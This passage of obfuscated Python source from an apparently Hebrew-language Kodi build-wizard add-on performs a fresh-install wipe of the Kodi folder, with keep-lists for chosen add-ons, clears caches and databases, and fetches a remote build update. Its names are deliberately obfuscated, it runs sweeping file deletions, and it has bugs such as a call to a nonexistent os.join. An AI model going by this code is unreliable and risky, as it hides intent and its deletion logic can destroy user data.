				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'skin.Premium.mod'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4900
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'skin.anonymous.nox'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4901
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'skin.phenomenal'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4902
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'plugin.video.metalliq'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4903
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'skin.titan'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4905
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'pvr.iptvsimple'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4906
				elif O00000OOO00O00O0O =='sources.xml'and OOO00O00000O000OO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4908
				elif O00000OOO00O00O0O =='quicknav.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4911
				elif O00000OOO00O00O0O =='x1101.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4912
				elif O00000OOO00O00O0O =='b-srtym-b.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4913
				elif O00000OOO00O00O0O =='x1102.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4914
				elif O00000OOO00O00O0O =='b-sdrvt-b.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4915
				elif O00000OOO00O00O0O =='x1112.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4916
				elif O00000OOO00O00O0O =='b-tlvvyzyh-b.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4917
				elif O00000OOO00O00O0O =='x1111.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4918
				elif O00000OOO00O00O0O =='b-tvknyshrly-b.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4919
				elif O00000OOO00O00O0O =='x1110.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4920
				elif O00000OOO00O00O0O =='b-yldym-b.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4921
				elif O00000OOO00O00O0O =='x1114.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4922
				elif O00000OOO00O00O0O =='b-mvzyqh-b.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4923
				elif O00000OOO00O00O0O =='mainmenu.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4924
				elif O00000OOO00O00O0O =='skin.Premium.mod.properties'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4925
				elif O00000OOO00O00O0O =='x1122.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4927
				elif O00000OOO00O00O0O =='b-spvrt-b.DATA.xml'and OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'script.skinshortcuts'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4928
				elif O00000OOO00O00O0O =='favourites.xml'and OOO00O00000O000OO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4933
				elif O00000OOO00O00O0O =='guisettings.xml'and OOO00O00000O000OO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4935
				elif O00000OOO00O00O0O =='profiles.xml'and OOO00O00000O000OO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4936
				elif O00000OOO00O00O0O =='advancedsettings.xml'and OOO00O00000O000OO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4937
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4938
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'program.apollo'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4939
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4940
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'plugin.video.elementum'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4943
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'service.subtitles.All_Subs'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4944
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4945
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'weather.yahoo'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4946
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'plugin.video.quasar'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4947
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'program.apollo'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4948
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4949
				elif OOO00O00000O000OO [OOO00000O00O00000 -2 ]=='userdata'and OOO00O00000O000OO [OOO00000O00O00000 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OOO00O00000O000OO [OOO00000O00O00000 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4950
				elif O00000OOO00O00O0O in LOGFILES :wiz .log ("Keep Log File: %s"%O00000OOO00O00O0O ,xbmc .LOGNOTICE )#line:4951
				elif O00000OOO00O00O0O .endswith ('.db'):#line:4952
					try :#line:4953
						if O00000OOO00O00O0O ==O0O00000O0O0000O0 and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O00000OOO00O00O0O ,KODIV ),xbmc .LOGNOTICE )#line:4954
						else :os .remove (os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ))#line:4955
					except Exception as OOOO0O0O00O0O0O00 :#line:4956
						if not O00000OOO00O00O0O .startswith ('Textures13'):#line:4957
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4958
							wiz .log ("-> %s"%(str (OOOO0O0O00O0O0O00 )),xbmc .LOGNOTICE )#line:4959
							wiz .purgeDb (os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ))#line:4960
				else :#line:4961
					DP .update (int (wiz .percentage (O00OO000000OO00O0 ,O0O0O00OO000000OO )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000OOO00O00O0O ),'')#line:4962
					try :os .remove (os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ))#line:4963
					except Exception as OOOO0O0O00O0O0O00 :#line:4964
						wiz .log ("Error removing %s"%os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),xbmc .LOGNOTICE )#line:4965
						wiz .log ("-> / %s"%(str (OOOO0O0O00O0O0O00 )),xbmc .LOGNOTICE )#line:4966
			if DP .iscanceled ():#line:4967
				DP .close ()#line:4968
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4969
				return False #line:4970
		for O00OO0OOOOOO0OO0O ,OOO0OO0OO0000000O ,OO0OO0OOO0OO0OOOO in os .walk (O000OO0O0OOOO000O ,topdown =True ):#line:4971
			OOO0OO0OO0000000O [:]=[O0O0OOO000OO000OO for O0O0OOO000OO000OO in OOO0OO0OO0000000O if O0O0OOO000OO000OO not in EXCLUDES ]#line:4972
			for O00000OOO00O00O0O in OOO0OO0OO0000000O :#line:4973
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00000OOO00O00O0O ),'')#line:4974
			  if O00000OOO00O00O0O not in ["Database","userdata","temp","addons","addon_data"]:#line:4975
			   if not (O00000OOO00O00O0O =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4976
			    if not (O00000OOO00O00O0O =='skin.titan'and KEEPSKIN3 =='true'):#line:4978
			      if not (O00000OOO00O00O0O =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4979
			       if not (O00000OOO00O00O0O =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4980
			        if not (O00000OOO00O00O0O =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4981
			         if not (O00000OOO00O00O0O =='program.apollo'and KEEPINFO =='true'):#line:4982
			          if not (O00000OOO00O00O0O =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4983
			           if not (O00000OOO00O00O0O =='weather.yahoo'and KEEPWEATHER =='true'):#line:4984
			            if not (O00000OOO00O00O0O =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4985
			             if not (O00000OOO00O00O0O =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4986
			              if not (O00000OOO00O00O0O =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4987
			               if not (O00000OOO00O00O0O =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4988
			                if not (O00000OOO00O00O0O =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4989
			                 if not (O00000OOO00O00O0O =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4990
			                  if not (O00000OOO00O00O0O =='plugin.video.neptune'and KEEPINFO =='true'):#line:4991
			                   if not (O00000OOO00O00O0O =='plugin.video.youtube'and KEEPINFO =='true'):#line:4992
			                    if not (O00000OOO00O00O0O =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4993
			                     if not (O00000OOO00O00O0O =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4994
			                       if not (O00000OOO00O00O0O =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4996
			                           if not (O00000OOO00O00O0O =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5000
			                            if not (O00000OOO00O00O0O =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5001
			                             if not (O00000OOO00O00O0O =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5002
			                              if not (O00000OOO00O00O0O =='plugin.video.quasar'and KEEPINFO =='true'):#line:5003
			                               if not (O00000OOO00O00O0O =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5004
			                                  shutil .rmtree (os .path .join (O00OO0OOOOOO0OO0O ,O00000OOO00O00O0O ),ignore_errors =True ,onerror =None )#line:5006
			if DP .iscanceled ():#line:5007
				DP .close ()#line:5008
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5009
				return False #line:5010
		DP .close ()#line:5011
		wiz .clearS ('build')#line:5012
		if over ==True :#line:5013
			return True #line:5014
		elif install =='restore':#line:5015
			return True #line:5016
		elif install :#line:5017
			buildWizard (install ,'normal',over =True )#line:5018
		else :#line:5019
			if INSTALLMETHOD ==1 :O0O0000OO00OOOOOO =1 #line:5020
			elif INSTALLMETHOD ==2 :O0O0000OO00OOOOOO =0 #line:5021
			else :O0O0000OO00OOOOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5022
			if O0O0000OO00OOOOOO ==1 :wiz .reloadFix ('fresh')#line:5023
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5024
	else :#line:5025
		if not install =='restore':#line:5026
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5027
			wiz .refresh ()#line:5028
def clearCache ():#line:5033
		wiz .clearCache ()#line:5034
def fixwizard ():#line:5038
		wiz .fixwizard ()#line:5039
def totalClean ():#line:5041
		wiz .clearCache ()#line:5043
		wiz .clearPackages ('total')#line:5044
		clearThumb ('total')#line:5045
		cleanfornewbuild ()#line:5046
def cleanfornewbuild ():#line:5047
		try :#line:5048
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5049
		except :#line:5050
			pass #line:5051
		try :#line:5052
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5053
		except :#line:5054
			pass #line:5055
		try :#line:5056
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5057
		except :#line:5058
			pass #line:5059
def clearThumb (type =None ):#line:5060
	OO00O0000O00000OO =wiz .latestDB ('Textures')#line:5061
	if not type ==None :O000OOOO00O0OO0OO =1 #line:5062
	else :O000OOOO00O0OO0OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO00O0000O00000OO ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5063
	if O000OOOO00O0OO0OO ==1 :#line:5064
		try :wiz .removeFile (os .join (DATABASE ,OO00O0000O00000OO ))#line:5065
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO00O0000O00000OO )#line:5066
		wiz .removeFolder (THUMBS )#line:5067
	else :wiz .log ('Clear thumbnames cancelled')#line:5069
	wiz .redoThumbs ()#line:5070
def purgeDb ():#line:5072
	OOO00OOOO0OO0OOOO =[];OO00O0OOO000O0OOO =[]#line:5073
	for OO0OOO0OOOOOO0O0O ,OOO0O00O0OOO0O000 ,OOO0OO000O0OO00OO in os .walk (HOME ):#line:5074
		for O0OOOOOOO00000000 in fnmatch .filter (OOO0OO000O0OO00OO ,'*.db'):#line:5075
			if O0OOOOOOO00000000 !='Thumbs.db':#line:5076
				OOOO00O0O00OO0OO0 =os .path .join (OO0OOO0OOOOOO0O0O ,O0OOOOOOO00000000 )#line:5077
				OOO00OOOO0OO0OOOO .append (OOOO00O0O00OO0OO0 )#line:5078
				OO00OO0OO0O000OOO =OOOO00O0O00OO0OO0 .replace ('\\','/').split ('/')#line:5079
				OO00O0OOO000O0OOO .append ('(%s) %s'%(OO00OO0OO0O000OOO [len (OO00OO0OO0O000OOO )-2 ],OO00OO0OO0O000OOO [len (OO00OO0OO0O000OOO )-1 ]))#line:5080
	if KODIV >=16 :#line:5081
		OO0OO0OO0000OO000 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO00O0OOO000O0OOO )#line:5082
		if OO0OO0OO0000OO000 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5083
		elif len (OO0OO0OO0000OO000 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5084
		else :#line:5085
			for O0O0OOO0O0OOOOO0O in OO0OO0OO0000OO000 :wiz .purgeDb (OOO00OOOO0OO0OOOO [O0O0OOO0O0OOOOO0O ])#line:5086
	else :#line:5087
		OO0OO0OO0000OO000 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO00O0OOO000O0OOO )#line:5088
		if OO0OO0OO0000OO000 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5089
		else :wiz .purgeDb (OOO00OOOO0OO0OOOO [O0O0OOO0O0OOOOO0O ])#line:5090
def fastupdatefirstbuild (OO0O0O00OO00O0OOO ):#line:5096
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5098
	if ENABLE =='Yes':#line:5099
		if not NOTIFY =='true':#line:5100
			OOO000OO0OOOOOO0O =wiz .workingURL (NOTIFICATION )#line:5101
			if OOO000OO0OOOOOO0O ==True :#line:5102
				O000000O0OO00O0OO ,OO0OOO0OO00OO0OO0 =wiz .splitNotify (NOTIFICATION )#line:5103
				if not O000000O0OO00O0OO ==False :#line:5105
					try :#line:5106
						O000000O0OO00O0OO =int (O000000O0OO00O0OO );OO0O0O00OO00O0OOO =int (OO0O0O00OO00O0OOO )#line:5107
						checkidupdate ()#line:5108
						wiz .setS ("notedismiss","true")#line:5109
						if O000000O0OO00O0OO ==OO0O0O00OO00O0OOO :#line:5110
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O000000O0OO00O0OO ),xbmc .LOGNOTICE )#line:5111
						elif O000000O0OO00O0OO >OO0O0O00OO00O0OOO :#line:5113
							wiz .log ("[Notifications] id: %s"%str (O000000O0OO00O0OO ),xbmc .LOGNOTICE )#line:5114
							wiz .setS ('noteid',str (O000000O0OO00O0OO ))#line:5115
							wiz .setS ("notedismiss","true")#line:5116
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5119
					except Exception as O00O0OOO000OOO00O :#line:5120
						wiz .log ("Error on Notifications Window: %s"%str (O00O0OOO000OOO00O ),xbmc .LOGERROR )#line:5121
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5123
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OOO000OO0OOOOOO0O ),xbmc .LOGNOTICE )#line:5124
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5125
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5126
def checkidupdate ():#line:5132
				wiz .setS ("notedismiss","true")#line:5134
				OOO0OOO000O00OOOO =wiz .workingURL (NOTIFICATION )#line:5135
				O0O0O0000OO000O00 =" Kodi Premium"#line:5137
				O0O0000OO0O00O0OO =wiz .checkBuild (O0O0O0000OO000O00 ,'gui')#line:5138
				O0O000OOOOO0O0OO0 =O0O0O0000OO000O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5139
				if not wiz .workingURL (O0O0000OO0O00O0OO )==True :return #line:5140
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5141
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0O0O0000OO000O00 ),'','אנא המתן')#line:5142
				OOOO00O00OO0O000O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O000OOOOO0O0OO0 )#line:5143
				try :os .remove (OOOO00O00OO0O000O )#line:5144
